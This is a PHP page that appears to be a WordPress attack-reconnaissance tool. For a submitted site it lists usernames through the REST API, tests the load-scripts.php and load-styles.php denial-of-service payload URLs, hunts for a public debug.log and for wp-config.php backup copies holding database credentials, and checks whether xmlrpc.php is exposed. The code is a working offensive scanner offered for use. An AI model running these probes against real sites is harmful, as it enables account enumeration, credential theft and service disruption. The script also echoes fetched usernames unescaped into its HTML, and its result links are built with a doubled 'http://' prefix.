<?php
error_reporting(0);
	$nomer = 1;
	$input = addhttp($_POST['wordpress']);
	
	$url = $input.'/wp-json/wp/v2/users';
	
	$url2 = $input.'/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter';
	
	$url3 = $input.'/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic';

	$url4 = $input.'/wp-content/debug.log';

	//Backup file
	$url5 = $input.'/.wp-config.php.swp';
	$url6 = $input.'/wp-config.inc';
	$url7 = $input.'/wp-config.old';
	$url8 = $input.'/wp-config.txt';
	$url9 = $input.'/wp-config.html';
	$url10 = $input.'/wp-config.php.bak';
	$url11 = $input.'/wp-config.php.dist';
	$url12 = $input.'/wp-config.php.inc';
	$url13 = $input.'/wp-config.php.old';
	$url14 = $input.'/wp-config.php.save';
	$url15 = $input.'/wp-config.php.swp';
	$url16 = $input.'/wp-config.php.txt';
	$url17 = $input.'/wp-config.php~';

	//xmlrpc
	$url18 = $input.'/xmlrpc.php';

	function addhttp($url) {
		if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
			$url = "http://" . $url;
		}
		return $url;
	}

	function getHttpcode($url){
	    $ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, true);    // we want headers
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$output = curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		return $httpcode;
	}

	$output = file_get_contents($url);
	$json = json_decode($output, true);
?>
<!DOCTYPE html>
<html>
<head>
	<title>Result WordPress</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
	<style type="text/css">
		a {
			font-size: 1em;
			margin: 25px 0px;
		}
		h3 {
			margin: 30px 0px;
		}
	</style>
</head>
<body>
	<div class="container">
		<h3>List WordPress Username</h3>
		<table class="table table-bordered">
			<tr>
				<th>Number</th>
				<th>Username Wordpress</th>
			<tr>
			<?php
				for($i=0; $i < count($json); $i++) {
					echo "<tr>";
					echo "<td>".$nomer++."</td>";
				    echo "<td>".$json[$i]["slug"]."</td>";
				    echo "</tr>";
				}
			?>
		</table>
		<h3 class="border-top border-dark">Denial of Service load-scripts.php</h3>
		<?php
			if (getHttpcode($url2) == "200") {
				echo '<a target="_blank" href="http://'.$url2.'">Check in here for full payload</a>';
			} else {
				echo "<h6>Not vuln</h6>";
			}
		?>
		<h3 class="border-top border-dark">Denial of Service load-styles.php</h3>
		<?php
			if (getHttpcode($url3) == "200") {
				echo '<a target="_blank" href="http://'.$url3.'">Check in here for full payload</a>';
			} else {
				echo "<h6>Not vuln</h6>";
			}
		?>
		<h3 class="border-top border-dark">Log files WordPress</h3>
		<?php
			if (getHttpcode($url4) == "200") {
				echo '<a target="_blank" href="http://'.$url4.'">'.$url4.'</a>';
			} else {
				echo "<h6>Not found</h6>";
			}
		?>
		<h3 class="border-top border-dark">Backup file wp-config.php</h3>
		<?php
			if (getHttpcode($url5) == "200") {
				echo '<a target="_blank" href="http://'.$url5.'">'.$url5.'</a>';
			} else if (getHttpcode($url6) == "200") {
				echo '<a target="_blank" href="http://'.$url6.'">'.$url6.'</a>';
			} else if (getHttpcode($url7) == "200") {
				echo '<a target="_blank" href="http://'.$url7.'">'.$url7.'</a>';
			} else if (getHttpcode($url8) == "200") {
				echo '<a target="_blank" href="http://'.$url8.'">'.$url8.'</a>';
			} else if (getHttpcode($url9) == "200") {
				echo '<a target="_blank" href="http://'.$url9.'">'.$url9.'</a>';
			} else if (getHttpcode($url10) == "200") {
				echo '<a target="_blank" href="http://'.$url10.'">'.$url10.'</a>';
			} else if (getHttpcode($url11) == "200") {
				echo '<a target="_blank" href="http://'.$url11.'">'.$url11.'</a>';
			} else if (getHttpcode($url12) == "200") {
				echo '<a target="_blank" href="http://'.$url12.'">'.$url12.'</a>';
			} else if (getHttpcode($url13) == "200") {
				echo '<a target="_blank" href="http://'.$url13.'">'.$url13.'</a>';
			} else if (getHttpcode($url14) == "200") {
				echo '<a target="_blank" href="http://'.$url14.'">'.$url14.'</a>';
			} else if (getHttpcode($url15) == "200") {
				echo '<a target="_blank" href="http://'.$url15.'">'.$url15.'</a>';
			} else if (getHttpcode($url16) == "200") {
				echo '<a target="_blank" href="http://'.$url16.'">'.$url16.'</a>';
			} else if (getHttpcode($url17) == "200") {
				echo '<a target="_blank" href="http://'.$url17.'">'.$url17.'</a>';
			} else {
				echo "<h6>Not found</h6>";
			}
		?>
		<h3 class="border-top border-dark">XML-RPC WordPress</h3>
		<?php
			if (getHttpcode($url18) == "405" || getHttpcode($url18) == "200") {
				echo '<a target="_blank" href="http://'.$url18.'">'.$url18.'</a>';
			} else {
				echo "<h6>Not vuln</h6>";
			}
		?>
	</div>
</body>
</html>
